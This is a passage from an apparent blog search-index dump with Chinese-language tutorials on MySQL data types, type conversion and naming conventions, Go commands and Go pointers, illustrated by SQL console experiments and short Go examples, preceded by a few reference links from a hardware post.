https://www.getkisi.com/blog/hack-hid-keycard http://www.fobcopy.com.au/hid-iclass.html https://www.getkisi.com/blog/hid-card-types https://lzy-wi.github.io/2018/07/26/proxmark3/","comments":true,"categories":[{"name":"Hardware","slug":"Hardware","permalink":"http://swsmile.info/categories/Hardware/"}],"tags":[{"name":"Hardware","slug":"Hardware","permalink":"http://swsmile.info/tags/Hardware/"}]},{"title":"【MySQL】数据类型","date":"2020-01-31T11:11:38.000Z","path":"2020/01/31/【MySQL】数据类型/","text":"数字类型 （Numeric Data Types）Integer Type (Exact Value)Difference is in range and storage. Choose unsigned to maximise the maximum value if not using negative values. TINYINT：一微小的整数，支持 -128到127（SIGNED），0到255（UNSIGNED），需要1个字节存储 SMALLINT：一个小整数，支持 -32768到32767（SIGNED），0到65535（UNSIGNED)，需要2个字节存储 MEDIUMINT：一个中等整数，支持 -8388608到8388607（SIGNED），0到16777215（UNSIGNED），需要3个字节存储 INT：一个整数，支持 -2147493648到2147493647（SIGNED），0到4294967295（UNSIGNED），需要4个字节存储 INTEGER：同INT BIGINT：一个大整数，支持 -9223372036854775808到9223372036854775807（SIGNED），0到18446744073709551615（UNSIGNED），需要8个字节存储 注意，默认为SIGNED，只有显式地声明为UNSIGNED，才是UNSIGNED Type Storage (Bytes) Minimum Value Signed Minimum Value Unsigned Maximum Value Signed Maximum Value Unsigned TINYINT 1 -128 0 127 255 SMALLINT 2 -32768 0 32767 65535 MEDIUMINT 3 -8388608 0 8388607 16777215 INT 4 -2147483648 0 2147483647 4294967295 BIGINT 8 -2$^{63}$ 0 2$^{63}$-1 2$^{64}$-1 See https://dev.mysql.com/doc/refman/5.6/en/integer-types.html for more details. 显示宽度当我们声明一个类型为int的列时候，需要指定它的宽度： 12345678CREATE TABLE `user_tab` ( `userid` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(128) NOT NULL DEFAULT '', `age` int(11) NOT NULL DEFAULT '0', PRIMARY KEY (`userid`), UNIQUE KEY `name` (`name`), KEY `age` (`age`)) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 注意，这里int(m) 里的m是表示使用SELECT以查询结果集时，显示该列中值的宽度。值得一提的是，这个m并不影响实际的取值范围。 我们只需要记住两点： 无论N等于多少，int永远占4个字节。 N表示的是显示宽度：当当前值的长度未达到设置的显示宽度时，不足的宽度用0补足（比如当前行在这个列的值为1，而N为5，则使用select显示这个值时，就是00001）；如果当前值的长度超过设置的显示宽度时（比如当前行在这个列的值为11111111，而N为5，则使用select显示这个值时，就是11111）。不过，这里还有个前提，该整型字段设置了unsigned zerofill。 实验，在没有设置 unsigned zerofill 时： 1234567891011121314151617181920212223mysql&gt; drop table if exists test_int_width;Query OK, 0 rows affected (0.00 sec)mysql&gt; create table test_int_width ( -&gt; a int(5), -&gt; b int(5), -&gt; c int(5) , -&gt; d int(8) -&gt; ) engine=innodb charset=utf8;Query OK, 0 rows affected (0.01 sec)mysql&gt;mysql&gt; insert into test_int_width values(1, 1, 1, 1111111111);Query OK, 1 row affected (0.00 sec)mysql&gt;mysql&gt; select * from test_int_width;+------+------+------+------------+| a | b | c | d |+------+------+------+------------+| 1 | 1 | 1 | 1111111111 |+------+------+------+------------+1 row in set (0.00 sec) 在设置了 unsigned zerofill 之后： 1234567891011121314151617181920mysql&gt; create table test_int_width ( -&gt; a int(5), -&gt; b int(5) unsigned, -&gt; c int(5) unsigned zerofill, -&gt; d int(8) unsigned zerofill -&gt; ) engine=innodb charset=utf8;Query OK, 0 rows affected (0.02 sec)mysql&gt;mysql&gt; insert into test_int_width values(1, 1, 1, 1111111111);Query OK, 1 row affected (0.00 sec)mysql&gt;mysql&gt; select * from test_int_width;+------+------+-------+------------+| a | b | c | d |+------+------+-------+------------+| 1 | 1 | 00001 | 1111111111 |+------+------+-------+------------+1 row in set (0.00 sec) 定点类型 - Fixed-Point Types (Exact Value) - DECIMAL, NUMERIC定点类型在数据库中存放的是精确值（相对比的是，浮点类型在数据库中存放的是近似值）。 decimal(m,d)：参数m （要求m &lt; 65） 指定总个数，参数d （要求d&lt;30且 d&lt;m）指定小数位。 类型名称 说明 存储需求 DECIMAL(M,D) 压缩的“严格”定点数 M+2个字节（在不指定M、D时默认为decimal(10, 0)） See https://dev.mysql.com/doc/refman/5.6/en/fixed-point-types.html for more details. 实验： 12345678910111213141516171819202122232425drop table if exists test_decimal;Query OK, 0 rows affected, 1 warning (0.00 sec)mysql&gt; create table test_decimal ( -&gt; float_num float(10, 2), -&gt; double_num double(20, 2), -&gt; decimal_num decimal(20, 2) -&gt; ) engine=innodb charset=utf8;Query OK, 0 rows affected (0.01 sec)mysql&gt;mysql&gt; insert into test_decimal values(1234567.66, 1234567899000000.66, 1234567899000000.66);Query OK, 1 row affected (0.00 sec)mysql&gt; insert into test_decimal values(1234567.66, 12345678990000000.66, 12345678990000000.66);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from test_decimal;+------------+----------------------+----------------------+| float_num | double_num | decimal_num |+------------+----------------------+----------------------+| 1234567.62 | 1234567899000000.80 | 1234567899000000.66 || 1234567.62 | 12345678990000000.00 | 12345678990000000.66 |+------------+----------------------+----------------------+2 rows in set (0.00 sec) 看到float、double类型存在精度丢失问题，即写入数据库的数据未必是插入数据库的数据，而decimal无论写入数据中的数据是多少，都不会存在精度丢失问题，这就是我们要引入decimal类型的原因，decimal类型常见于银行系统、互联网金融系统等对小数点后的数字比较敏感的系统中。 最后讲一下decimal和float/double的区别，个人总结主要体现在两点上： float/double在DB中存储的是近似值，而decimal则是以字符串形式进行保存的 decimal(M,D)的规则和float/double相同，但区别在float/double在不指定M、D时默认按照实际精度来处理；而decimal在不指定M、D时默认为decimal(10, 0) 浮点类型 - Floating-Point Types (Approximate Value) - FLOAT, DOUBLE MySQL数据类型 含义 float(m,d) 单精度浮点型 8位精度（4字节），m总个数，d小数位数（在不指定M、D时默认按照实际精度来处理） double(m,d) 双精度浮点型 16位精度（8字节） m总个数，d小数位数（在不指定M、D时默认按照实际精度来处理） 注意，当指定一个字段的类型为float或者double时，需要指定总个数和小数位数。 设一个字段定义为float(5,3)，如果插入一个为123.45678的数，则实际存入DB的是123.457（即存入时四舍五入，并忽略多出的小数部分）。但如果插入了一个多于指定的总个数的位数的数（会直接出现Out of range value for column 错误）。 实验： 123456789101112131415161718192021222324252627282930313233343536373839mysql&gt; drop table if exists test_float;Query OK, 0 rows affected (0.01 sec)mysql&gt; create table test_float ( -&gt; num float(5, 2) -&gt; ) engine=innodb charset=utf8;Query OK, 0 rows affected (0.01 sec)# 存入时，发生了忽略多出的小数部分的操作mysql&gt; insert into test_float values(1.233);Query OK, 1 row affected (0.00 sec)# 存入时，发生了四舍五入mysql&gt; insert into test_float values(1.237);Query OK, 1 row affected (0.00 sec)mysql&gt; insert into test_float values(10.233);Query OK, 1 row affected (0.00 sec)mysql&gt; insert into test_float values(100.233);Query OK, 1 row affected (0.00 sec)mysql&gt; insert into test_float values(1000.233);ERROR 1264 (22003): Out of range value for column 'num' at row 1mysql&gt; insert into test_float values(10000.233);ERROR 1264 (22003): Out of range value for column 'num' at row 1mysql&gt; insert into test_float values(100000.233);ERROR 1264 (22003): Out of range value for column 'num' at row 1mysql&gt;mysql&gt; select * from test_float;+--------+| num |+--------+| 1.23 || 1.24 || 10.23 || 100.23 |+--------+4 rows in set (0.00 sec) See https://dev.mysql.com/doc/refman/5.6/en/floating-point-types.html for more details. Bit-Value Type - BITSee https://dev.mysql.com/doc/refman/5.6/en/bit-type.html for more details. Date and Time Data Types MySQL数据类型 字节长度 含义 date 3 以YYYY-MM-DD的格式显示，比如：2009-07-19 time 3 以HH:MM:SS的格式显示。比如：11:22:30 datetime 8 以YYYY-MM-DD HH:MM:SS的格式显示，比如：2009-07-19 11:22:30 timestamp 4 2015-05-01 11:12:00 year 4 2015 MySQL的时间类型的知识点比较简单，这里重点关注一下datetime与timestamp两种类型的区别： 上面列了，datetime占8个字节，timestamp占4个字节 由于大小的区别，datetime与timestamp能存储的时间范围也不同，datetime的存储范围为1000-01-01 00:00:00——9999-12-31 23:59:59，timestamp存储的时间范围为19700101080001——20380119111407 datetime默认值为空，当插入的值为null时，该列的值就是null；timestamp默认值不为空，当插入的值为null的时候，mysql会取当前时间 datetime存储的时间与时区无关，timestamp存储的时间及显示的时间都依赖于当前时区 1234567891011121314151617181920212223mysql&gt; drop table if exists test_time;Query OK, 0 rows affected, 1 warning (0.00 sec)mysql&gt; create table test_time ( -&gt; date_value date, -&gt; time_value time, -&gt; year_value year, -&gt; datetime_value datetime, -&gt; timestamp_value timestamp -&gt; ) engine=innodb charset=utf8;Query OK, 0 rows affected (0.02 sec)mysql&gt;mysql&gt; insert into test_time values(now(), now(), now(), now(), now());Query OK, 1 row affected, 1 warning (0.01 sec)mysql&gt; select * from test_time;+------------+------------+------------+---------------------+---------------------+| date_value | time_value | year_value | datetime_value | timestamp_value |+------------+------------+------------+---------------------+---------------------+| 2020-04-25 | 22:06:54 | 2020 | 2020-04-25 22:06:54 | 2020-04-25 22:06:54 |+------------+------------+------------+---------------------+---------------------+1 row in set (0.00 sec) See https://dev.mysql.com/doc/refman/5.6/en/date-and-time-types.html for more details. String Data TypesSpatial Data TypesString MySQL数据类型 含义 char(n) 固定长度（无论字符实际长度是多少，都会按照指定的长度存储，不够的用空格补足），n指定字符长度，最大为255（因此最多255个字符）。 varchar(n) 可变长度字符串，固定长度，最多65535个字符 tinytext 可变长度，最多255个字符 text 可变长度，最多65535个字符 mediumtext 可变长度，最多2的24次方-1个字符 longtext 可变长度，最多2的32次方-1个字符 char和varcharchar(n) 若存入字符数小于n，则以空格补于其后，查询之时再将空格去掉。所以char类型存储的字符串末尾不能有空格（否则添加的空格在被查询时会被移除掉），varchar则无这个要求。 实验： 1234567891011121314151617181920212223242526272829303132mysql&gt; drop table if exists test_string;Query OK, 0 rows affected (0.01 sec)mysql&gt; create table test_string ( -&gt; char_value char(5), -&gt; varchar_value varchar(5) -&gt; ) engine=innodb charset=utf8;Query OK, 0 rows affected (0.01 sec)mysql&gt;mysql&gt; insert into test_string values('a', 'a');Query OK, 1 row affected (0.00 sec)mysql&gt; insert into test_string values(' a', ' a');Query OK, 1 row affected (0.00 sec)mysql&gt; insert into test_string values('a ', 'a ');Query OK, 1 row affected (0.01 sec)mysql&gt; insert into test_string values(' a ', ' a ');Query OK, 1 row affected (0.00 sec)mysql&gt; select length(char_value), length(varchar_value) from test_string;+--------------------+-----------------------+| length(char_value) | length(varchar_value) |+--------------------+-----------------------+| 1 | 1 || 2 | 2 || 1 | 2 || 2 | 3 |+--------------------+-----------------------+4 rows in set (0.01 sec) 这验证了我们的结论，对char类型的数据，插入时会被包含空格以存储，但是在被查询处理时，这些空格不会被包含 char(n) 固定长度，其中n指定了长度。对于类型为char(4)的数据，不管是存入的数据包含几个字符，最终该数据都会占用4个字节。 varchar是存入的实际字符数+1个字节（n&lt;=255）或2个字节（n&gt;255），所以varchar(4)，存入一个占用3个字符的字符串，将占用4个字节。 char类型的字符串检索速度要比varchar类型的快。 varchar和text1.varchar可指定n，text不能指定，内部存储varchar是存入的实际字符数+1个字节（n&lt;=255）或2个字节(n&gt;255)，text是实际字符数+2个字 节。 2.text类型不能有默认值。 3.varchar可直接创建索引，text创建索引要指定前多少个字符。varchar查询速度快于text,在都创建索引的情况下，text的索引似乎不起作用。 varchar我们来探究一下varchar型数据实际占用空间大小是如何计算的以及最大可容纳的字符串为多少，首先要给出结论： 实际占用空间大小和当前使用的编码方式有关。 最大可容纳的字符串也和当前使用的编码方式有关。 先写一段SQL创建表，utf8的编码格式： 1234drop table if exists test_varchar;create table test_varchar ( varchar_value varchar(100000)) engine=innodb charset=utf8; 执行报错： 1Column length too big for column &apos;varchar_value&apos; (max = 21845); use BLOB or TEXT instead 按照提示，我们把大小改为21845，执行依然报错： 1Row size too large. The maximum row size for the used table type, not counting BLOBs, is 65535. This includes storage overhead, check the manual. You have to change some columns to TEXT or BLOBs 改为21844就不会有问题（这其实是因为，MySQL要求一个行的定义长度不能超过65535 Bytes （64KB）），因此在utf8编码下我们可以知道varchar(M)，M最大=21844。 那么gbk呢： 1234drop table if exists test_varchar;create table test_varchar ( varchar_value varchar(100000)) engine=innodb charset=gbk; 同样的报错： 1Column length too big for column &apos;varchar_value&apos; (max = 32767); use BLOB or TEXT instead 把大小改为32766，也是和utf8编码格式一样的报错： 1Row size too large. The maximum row size for the used table type, not counting BLOBs, is 65535. This includes storage overhead, check the manual. You have to change some columns to TEXT or BLOBs 可见gbk的编码格式下，varchar(M)最大的M=32765。 text和blob最后讲一讲text和blob两种数据类型，它们的设计初衷是为了存储大数据使用的，因为之前说了，MySQL单行最大数据量为64KB。 先说一下text，text和varchar是一组既有区别又有联系的数据类型，其联系在于当varchar(M)的M大于某些数值时，varchar会自动转为text： M&gt;255时转为tinytext M&gt;500时转为text M&gt;20000时转为mediumtext 所以过大的内容varchar和text没有区别，同时varchar(M)和text的区别在于： 单行64K即65535字节的空间，varchar只能用63352/65533个字节，但是text可以65535个字节全部用起来 text可以指定text(M)，但是M无论等于多少都没有影响 text不允许有默认值，varchar允许有默认值 varchar和text两种数据类型，使用建议是能用varchar就用varchar而不用text（存储效率高），varchar(M)的M有长度限制，之前说过，如果大于限制，可以使用mediumtext（16M）或者longtext（4G）。 至于text和blob，简单过一下就是text存储的是字符串而blob存储的是二进制字符串，简单说blob是用于存储例如图片、音视频这种文件的二进制数据的。 二进制数据（Blob） Blob 和text存储方式不同，TEXT以文本方式存储，英文存储区分大小写，而 Blob 是以二进制方式存储，不分大小写。 Blob 存储的数据只能整体读出。 TEXT可以指定字符集，Blob 不用指定字符集。 enum类型enum类型又称为枚举类型，在创建表时，enum类型的取值范围就以列表的形式指定了。其基本形式如下：属性名 enum(‘值1’,’值2’,…,’值n’)，其中属性名参数指定字段的名称，‘值n’参数表示列表中的第n个值，这些值末尾的空格将会被系统直接删除。注意： enum类型的值只能去列表中的一个元素，其取值列表中最多只能有65535个值。列表中的每个值都有一个顺序排列的编号，MySQL中存入的是这个编号，而不是列表中的值。 如果enum类型加上了not null属性，其默认值为取值列表中的第一个元素。如果不加not null属性，enum类型将允许插入null，而且null为默认值。 Reference https://dev.mysql.com/doc/refman/5.6/en/data-types.html https://dev.mysql.com/doc/refman/8.0/en/data-types.html https://blog.csdn.net/bzhxuexi/article/details/43700435 https://www.cnblogs.com/xrq730/p/8446246.html","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【MySQL】MySQL 中的各种数据类型转换","date":"2020-01-31T11:07:37.000Z","path":"2020/01/31/【MySQL】-MySQL中的各种数据类型转换/","text":"Int -&gt; varcher将Int 转为varchar可以用 concat函数，比如 concat(8,’0′) 得到字符串 ’80′。 12345678910111213141516171819202122delete from core_channel;drop procedure if exists insert_channel;delimiter //CREATE procedure insert_channel()wholeblock:BEGIN declare str VARCHAR(255) default ''; declare x INT default 0; SET x = 1; WHILE x &lt;= 10 DO insert into core_channel (name) values (CONCAT(\"name\",x)); SET x = x + 1; END WHILE; select str;END//call insert_channel (); Varcher -&gt; Int将varchar 转为 Int 用 cast(a as signed)，a为varchar类型的字符串。","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【MySQL】命名习惯","date":"2020-01-31T11:04:39.000Z","path":"2020/01/31/【MySQL】命名习惯/","text":"MySQL naming conventions Use meaningful names. Avoid MySQL reserved keywords. Use lower_case_underscores. Database: prefix &lt;project name&gt; and suffix “_db” e.g. CMS_chat_db Table: suffix “_tab” e.g. order_tab Field: e.g. create_time Index: joined keys with prefix “idx_” e.g. idx_key1_key2","comments":true,"categories":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/categories/MySQL/"}],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"http://swsmile.info/tags/MySQL/"}]},{"title":"【Golang】Golang 命令","date":"2020-01-30T07:04:30.000Z","path":"2020/01/30/【Golang】Go-命令/","text":"Golang 命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950$ goGo is a tool for managing Go source code.Usage: go &lt;command&gt; [arguments]The commands are: bug start a bug report build compile packages and dependencies clean remove object files and cached files doc show documentation for package or symbol env print Go environment information fix update packages to use new APIs fmt gofmt (reformat) package sources generate generate Go files by processing source get add dependencies to current module and install them install compile and install packages and dependencies list list packages or modules mod module maintenance run compile and run Go program test test packages tool run specified go tool version print Go version vet report likely mistakes in packagesUse \"go help &lt;command&gt;\" for more information about a command.Additional help topics: buildmode build modes c calling between Go and C cache build and test caching environment environment variables filetype file types go.mod the go.mod file gopath GOPATH environment variable gopath-get legacy GOPATH go get goproxy module proxy protocol importpath import path syntax modules modules, module versions, and more module-get module-aware go get module-auth module authentication using go.sum module-private module configuration for non-public modules packages package lists and patterns testflag testing flags testfunc testing functionsUse \"go help &lt;topic&gt;\" for more information about that topic. go buildgo build是我们非常常用的命令，它可以启动编译，把我们的包和相关的依赖编译成一个可执行的文件。 1usage: go build [-o output] [-i] [build flags] [packages] go build的使用比较简洁，所有的参数都可以忽略，直到只有go build，这个时候意味着使用当前目录进行编译，下面的几条命令是等价的： 12345678go buildgo build .go build hello.go// 指定生成二进制文件路径go build -o hello hello.go go getThis default version selection can be overridden by adding an @version suffix to the package argument, as in ‘go get golang.org/x/text@v0.3.0’. The version suffix @latest explicitly requests the latest minor release of the module named by the given path. The suffix @upgrade is like @latest but will not downgrade a module if it is already required at a revision or pre-release version newer than the latest released version. The suffix @patch requests the latest patch release: the latest released version with the same major and minor version numbers as the currently required version. Like @upgrade, @patch will not downgrade a module already required at a newer version. If the path is not already required, @upgrade and @patch are equivalent to @latest. 参数含义The -t flag instructs get to consider modules needed to build tests of packages specified on the command line. The -u flag instructs get to update modules providing dependencies of packages named on the command line to use newer minor or patch releases when available. Continuing the previous example, ‘go get -u A’will use the latest A with B v1.3.1 (not B v1.2.3). If B requires module C, but C does not provide any packages needed to build packages in A (not including tests), then C will not be updated. The -u=patch flag (not -u patch) also instructs get to update dependencies, but changes the default to select patch releases. Continuing the previous example, ‘go get -u=patch A@latest’ will use the latest A with B v1.2.4 (not B v1.2.3), while ‘go get -u=patch A’ will use a patch release of A instead. When the -t and -u flags are used together, get will update test dependencies as well. Reference https://halfrost.com/go_command/","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】指针（Pointers）","date":"2020-01-30T06:59:07.000Z","path":"2020/01/30/【Golang】类型-指针/","text":"指针（Pointers）我们都知道，变量是一种使用方便的占位符，用于引用计算机内存地址。 Go 语言的取地址符是 &amp;，放到一个变量前使用就会返回相应变量的内存地址。 在一个指针类型的变量前面加上 * 号（前缀）来获取指针所指向的内容。 在一个非指针类型的变量前面加上 &amp; 来获取一个变量所存储的内存地址的地址值 以下实例演示了变量在内存中地址： 实例 1234567891011121314package mainimport \"fmt\"func main() &#123; var a int = 10 //声明非指针变量 fmt.Printf(\"变量的地址: %x\\n\", &amp;a) var ip *int //声明指针变量 ip = &amp;a //指针变量的存储地址 fmt.Printf(\"变量的值: %d\\n\", *ip)&#125; 执行以上代码输出结果为： 12变量的地址: c0000180b8变量的值: 10 什么是指针（指针变量）一个指针变量保存了一个值的内存地址。 类似于变量和常量，在使用指针前你需要声明指针。指针声明格式如下： 1var var_name *var-type var-type 为指针类型，var_name 为指针变量名，* 号用于指定变量是作为一个指针。以下是有效的指针声明： 12var ip *int /* 指向整型*/var fp *float32 /* 指向浮点型 */ 本例中这是一个指向 int 和 float32 的指针。 如何使用指针指针使用流程： 定义指针变量。 为指针变量赋值。 访问指针变量中指向地址的值。 在一个指针类型的变量前面加上 * 号（前缀）来获取指针所指向的内容。 实例 123456789101112131415161718package mainimport &quot;fmt&quot;func main() &#123; var a int= 20 */\\* 声明实际变量 \\*/* var ip *int */\\* 声明指针变量 \\*/* ip = &amp;a */\\* 指针变量的存储地址 \\*/* fmt.Printf(&quot;a 变量的地址是: %x\\n&quot;, &amp;a ) */\\* 指针变量的存储地址 \\*/* fmt.Printf(&quot;ip 变量储存的指针地址: %x\\n&quot;, ip ) */\\* 使用指针访问值 \\*/* fmt.Printf(&quot;*ip 变量的值: %d\\n&quot;, *ip )&#125; 以上实例执行输出结果为： 123a 变量的地址是: 20818a220ip 变量储存的指针地址: 20818a220*ip 变量的值: 20 Go 空指针 - nil当一个指针被定义后没有分配到任何变量时，它的值为 nil。 nil 指针也称为空指针。 nil在概念上和其它语言的null、None、nil、NULL一样，都指代零值或空值。 一个指针变量通常缩写为 ptr。 查看以下实例： 实例 123456789package mainimport &quot;fmt&quot;func main() &#123; var ptr *int fmt.Printf(&quot;ptr 的值为 : %x\\n&quot;, ptr )&#125; 以上实例输出结果为： 1ptr 的值为 : 0 空指针判断： 12if(ptr != nil) /* ptr 不是空指针 */if(ptr == nil) /* ptr 是空指针 */ Go 语言指针作为函数参数Go 语言允许向函数传递指针，只需要在函数定义的参数上设置为指针类型即可。 以下实例演示了如何向函数传递指针，并在函数调用后修改函数内的值，： 实例 12345678910111213141516171819202122232425262728package mainimport &quot;fmt&quot;func main() &#123; */\\* 定义局部变量 \\*/* var a int = 100 var b int= 200 fmt.Printf(&quot;交换前 a 的值 : %d\\n&quot;, a ) fmt.Printf(&quot;交换前 b 的值 : %d\\n&quot;, b ) */\\* 调用函数用于交换值 \\* &amp;a 指向 a 变量的地址 \\* &amp;b 指向 b 变量的地址 \\*/* swap(&amp;a, &amp;b); fmt.Printf(&quot;交换后 a 的值 : %d\\n&quot;, a ) fmt.Printf(&quot;交换后 b 的值 : %d\\n&quot;, b )&#125;func swap(x *int, y *int) &#123; var temp int temp = *x */\\* 保存 x 地址的值 \\*/* *x = *y */\\* 将 y 赋值给 x \\*/* *y = temp */\\* 将 temp 赋值给 y \\*/*&#125; 以上实例允许输出结果为： 1234交换前 a 的值 : 100交换前 b 的值 : 200交换后 a 的值 : 200交换后 b 的值 : 100 &amp; - 取地址符我们都知道，变量是一种使用方便的占位符，用于引用计算机内存地址。 Go 语言的取地址符是 &amp;，放到一个变量前使用就会返回当前变量的内存地址。 以下实例演示了变量在内存中地址： 123456789package mainimport \"fmt\"func main() &#123; var a int = 10 fmt.Printf(\"变量的地址: %x\\n\", &amp;a )&#125; 执行以上代码输出结果为： 1变量的地址: 20818a220 Go中在 Go 中，没有值传递和引用传递的区别。或者说，如果没有显式地进行引用传递，那所有的赋值操作都是值传递（即使是对于复杂数据类型），例子： 12345678910111213141516171819202122func main() &#123; a := 1 b := a fmt.Printf(\"%p\\n\", &amp;a) fmt.Printf(\"%p\\n\", &amp;b) fmt.Println() var m map[int]string = map[int]string&#123; 0: \"0\", 1: \"1\", &#125; mm := m fmt.Printf(\"%p\\n\", &amp;m) fmt.Printf(\"%p\\n\", &amp;mm)&#125;//output0xc0000180b80xc0000180c00xc00000e0300xc00000e038 这说明，即使对于一个值类型变量，将其赋值给另一个变量，该值也会被复制一份。这意味着，修改新变量的值并不能对旧变量有任何影响。 现在我们已经了解了什么是内存地址和如何去访问它。接下来我们将具体介绍指针（指针变量）。 指针变量一个指针变量保存了一个值的内存地址，也就是说，指针变量保存的是一个内存地址 与使用变量和常量类似，在使用指针前，你需要声明指针。指针声明格式如下： 1var var_name *var-type var-type 为指针类型，var_name 为指针变量名，* 号用于指定该变量是作为一个指针变量。 以下均是正确的指针变量声明方式： 12var ip *int /* 指向整型*/var fp *float32 /* 指向浮点型 */ 本例中这是一个指向 int 和 float32 的指针。 Example 1 - 如何使用指针变量指针使用流程： 声明指针变量。 为指针变量赋值。 访问指针变量中指向地址的值，或者说，获取指针变量中保存的地址值，并访问这个地址值上的内容。 在指针变量前面加上 * 号（前缀）来获取指针所指向地址上存储变量的内容。 实例 123456789101112131415161718package mainimport \"fmt\"func main() &#123; var a int= 20 */\\* 声明实际变量 \\*/* var ip *int */\\* 声明指针变量 \\*/* ip = &amp;a */\\* 指针变量的存储地址 \\*/* fmt.Printf(\"a 变量的地址是: %x\\n\", &amp;a ) */\\* 指针变量的存储地址 \\*/* fmt.Printf(\"ip 变量储存的指针地址: %x\\n\", ip ) */\\* 使用指针访问值 \\*/* fmt.Printf(\"*ip 变量的值: %d\\n\", *ip )&#125; 以上实例执行输出结果为： 123a 变量的地址是: 20818a220ip 变量储存的指针地址: 20818a220*ip 变量的值: 20 Example 212345678910111213package mainimport \"fmt\"func main() &#123; var p *int p = new(int) *p = 1 fmt.Println(p, &amp;p, *p)&#125;//输出0xc04204a080 0xc042068018 1 在 Go 中 * 代表取指针变量中存储的内存地址上对应的值，&amp; 代表取一个变量的内存地址 对于指针，我们一定要记住：指针储存的是一个内存地址值，但本身这个指针本身也需要地址来储存 如上 p 是一个指针，他的值为 0xc04204a080（是一个内存地址） 而指针变量 p 的内存地址为 0xc042068018 内存地址 0xc04204a080 储存的值为 1 地址 0xc042068018 0xc04204a080 值 0xc04204a080 1 Example 3 - 错误实例如果我们在声明一个指针变量时，像普通变量那样给他赋值： 12345678package mainimport \"fmt\"func main() &#123; var i *int *i = 1 fmt.Println(i, &amp;i, *i)&#125; 就会报以下错误： 12panic: runtime error: invalid memory address or nil pointer dereference[signal 0xc0000005 code=0x1 addr=0x0 pc=0x498025] 报这个错的原因是 go 在初始化指针的时候，会将指针变量值赋为 nil ； 由于指针变量 i 还没指向一个有效的内存空间，就执行了 *i = 1（这行代码的含义是：将指针变量 i 指向的内存空间位置的值设为 1）； 因此，go 的执行器就不知道要将哪个内存空间位置的值设为 1了； 解决这个问题非常简单，在给指针赋值前可以先创建一块内存空间，并让指针对象指向这块内存空间： 123456789package mainimport \"fmt\"func main() &#123; var i *int i = new(int) *i = 1 fmt.Println(i, &amp;i, *i)&#125; Example4 - 指向对象的指针变量123456789101112131415161718192021222324252627func main() &#123; user := User&#123;UserName: \"user1\"&#125; fmt.Println(user) fmt.Printf(\"%p\\n\", &amp;user) tryToModify(user) fmt.Println(user) fmt.Printf(\"%p\\n\", &amp;user)&#125;func tryToModify(u User) &#123; fmt.Println(u) fmt.Printf(\"%p\\n\", &amp;u) u.UserName = \"user2\"&#125;//output&#123;user1&#125;0xc000170090&#123;user2&#125;0xc0001701b0&#123;user1&#125;0xc000170090 我们来分析一下： 首先，user 是一个 User 对象（注意，user 不是指针变量），它，这个对象的空间地址为 0xc000170090； 当调用 tryToModify(user)时，会隐式执行 u = user ，这意味着：我们把之前的这个 User 对象复制一份（其实复制到了 0xc0001701b0），新的这个 User 对象叫 u，它位于 0xc0001701b0； 显然，修改叫 u 的这个新的 User 对象的 UserName 属性（u.UserName = &quot;user2&quot;）并不能影响之前那个叫 user 的 User 对象的值。 自然地，你想知道，如何在一个函数中修改对象的属性： 123456789101112131415161718192021222324252627func main() &#123; user := User&#123;UserName: \"user1\"&#125; fmt.Println(user) fmt.Printf(\"%p\\n\", &amp;user) tryToModify(&amp;user) fmt.Println(user) fmt.Printf(\"%p\\n\", &amp;user)&#125;func tryToModify(u *User) &#123; fmt.Println(user) fmt.Printf(\"%p\\n\", u) u.UserName = \"user2\"&#125;//output&#123;user1&#125;0xc000184090&#123;user1&#125;0xc000184090&#123;user2&#125;0xc000184090 我们需要将 u 声明为一个指针变量（即 func tryToModify(u *User) ） ； 同时，在调用 tryToModify 时，需要提供 user 对象的地址（而不是提供 user 对象，因为并不能将一个对象赋值给一个指针变量，而只能将一个空间地址赋值给一个指针变量），因此改为 tryToModify(&amp;user)。 这样，我们就实现了在一个函数内修改对象的属性。 总结123456789101112131415161718package mainimport \"fmt\"func main() &#123; var a int = 20 */\\* 声明一个变量 \\*/* var ip *int */\\* 声明一个指针变量 \\*/* ip = &amp;a */\\* &amp;a 表示获取这个变量所存储在的内存地址值，并将这个内存地址值赋值为指针变量 \\*/* fmt.Printf(\"a 变量的地址是: %x\\n\", &amp;a ) */\\* &amp;a 表示获取变量 a 所存储在的内存地址值 \\*/* */\\* 指针变量的存储地址 \\*/* fmt.Printf(\"ip 变量储存的指针地址: %x\\n\", ip ) */\\* 使用指针访问值 \\*/* fmt.Printf(\"*ip 变量的值: %d\\n\", *ip )&#125; 只有对于一个普通的变量（比如 var a int = 20），才能使用 &amp; 运算符，这（ &amp;a ）表示获取这个变量所存储在的内存地址值）； 对于对于一个指针变量（比如 var ip *int ），才能使用 * 运算符，这（ *ip 表示获取这个指针变量所存储在的内存地址值上记录的值）。 Go 空指针 - 指针的默认值当一个指针被定义后没有没有指向任何内存地址（或者说，没有为该指针变量赋值），它的值为 nil。 nil 指针也称为空指针。 nil在概念上和其它语言的null、None、nil、NULL一样，都指代零值或空值。 一个指针变量通常缩写为 ptr。 实例 123456789package mainimport \"fmt\"func main() &#123; var ptr *int fmt.Printf(\"ptr 的值为 : %x\\n\", ptr )&#125; 以上实例输出结果为： 1ptr 的值为 : 0 空指针判断： 12if(ptr != nil) /* ptr 不是空指针 */if(ptr == nil) /* ptr 是空指针 */ Go 语言指针作为函数参数Go 语言允许向函数传递指针，只需要在函数定义的参数上设置为指针类型即可。 以下实例演示了如何向函数传递指针，并在函数调用后修改函数内的值： 12345678910111213141516171819202122232425262728package mainimport \"fmt\"func main() &#123; */\\* 定义局部变量 \\*/* var a int = 100 var b int= 200 fmt.Printf(\"交换前 a 的值 : %d\\n\", a ) fmt.Printf(\"交换前 b 的值 : %d\\n\", b ) */\\* 调用函数用于交换值 \\* 